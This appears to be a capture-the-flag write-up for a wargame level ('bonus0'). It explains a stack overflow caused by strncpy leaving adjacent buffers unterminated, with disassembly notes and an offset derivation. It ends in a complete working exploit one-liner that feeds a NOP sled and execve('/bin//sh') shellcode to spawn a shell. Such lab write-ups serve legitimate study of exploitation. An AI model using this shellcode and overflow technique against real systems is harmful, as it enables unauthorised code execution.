# Way to bonus1

## Core
`main` calls `pp(dest)` (dest = a small buffer in main's `0x40` frame) then `puts(dest)`.
`pp` reads two strings and concatenates them into `dest`. The bug is in how the two strings
are produced: `p(buf, " - ")` does `read(0, local, 0x1000)` then `strncpy(buf, local, 20)`.
`strncpy` of ≥20 bytes copies exactly 20 and **does not NUL-terminate**; `buf1`(ebp-0x30) and
`buf2`(ebp-0x1c) are exactly `0x14 = 20` bytes apart and contiguous. So `strcpy(dest, buf1)`
runs straight through buf1 into buf2 as one 40-byte string → overflow of main's small `dest`,
overwriting saved EIP. The shellcode survives in `p`'s `0x1000` read buffer on the stack.

## Decisive disass (full: `disas main`, `disas pp`, `disas p`)
```
p(buf, prompt):
<+38..45>: call read@plt         ; read(0, local=ebp-0x1008, 0x1000) — keeps FULL input on stack
<+67>:     call strchr@plt       ; strchr(local,'\n')
<+72>:     movb $0x0,(%eax)       ; newline -> NUL
<+81..99>: strncpy(buf, local, 0x14)   ; copies 20, NO NUL-terminate if input>=20
pp(dest):
<+16>: lea -0x30(%ebp) ; call p  ; p(buf1, " - ")   buf1 = ebp-0x30
<+35>: lea -0x1c(%ebp) ; call p  ; p(buf2, " - ")   buf2 = ebp-0x1c  (buf1+0x14, contiguous)
<+59>: call strcpy@plt           ; strcpy(dest, buf1) — no NUL -> flows buf1 into buf2
<+122>: call strcat@plt          ; strcat(dest, buf2) — appends again
main:
<+9>:  lea 0x16(%esp),%eax ; call pp   ; dest = esp+0x16 in a 0x40 frame
```

## Exploit
- offset 29 (derivation, gdb): feed s1=`"0123456789"*2` (20 B, fills buf1, no NUL) and s2=a
  De Bruijn pattern. Crash `eip = 0x41336141` = bytes `"Aa3A"` = **offset 9** inside s2. So
  saved EIP sits at `dest + 20 (s1) + 9 = 29`; i.e. in s2 the return addr goes after `A`*9.
- Values:
  - `addr = 0xbfffe6d0` (`\xd0\xe6\xff\xbf`): points into the NOP sled left by s1 inside
    `p`'s stack read buffer. Stack address → measure **outside gdb** (gdb shifts the stack).
  - 28-byte `execve("/bin//sh")` + `exit` shellcode (same stub family as [[level9]]).
- Payload (two stdin lines; strncpy caps buf1/buf2 at 20, but `read` keeps all of s1 resident):
  ```
  s1 = \x90*100 + shellcode(28)     ; NOP sled + shellcode, lives in p's read buffer
  s2 = "A"*9 + addr + "B"*7         ; strcpy chain writes this past buf1 -> overwrites EIP
  ```
  Shellcode cannot ride in s2: s2's job is the fixed-offset EIP overwrite, and 20 bytes is too
  little for a NOP sled; s1's `read(,0x1000)` buffer is the roomy, persistent landing zone.
- Delivery: both via **stdin**; trailing `cat` keeps stdin open so the spawned `/bin/sh` is
  interactive (same idea as level5's `cat -`).
```bash
(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\xd0\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
```

## Diff from previous
level9 injected shellcode onto the **heap** and hijacked a C++ **vtable pointer** via
`argv[1]`. bonus0 is a **stack** return-address overwrite driven by `strncpy`'s
no-NUL-terminate quirk: two 20-byte, non-terminated, adjacent buffers get glued by `strcpy`
into one 40-byte string that overflows main's frame. New wrinkles vs level9: input is split
across two `read` calls over **stdin**, and the shellcode is parked in `p`'s large read buffer
on the stack (jumped to via a NOP sled) instead of sitting at the overflow site.
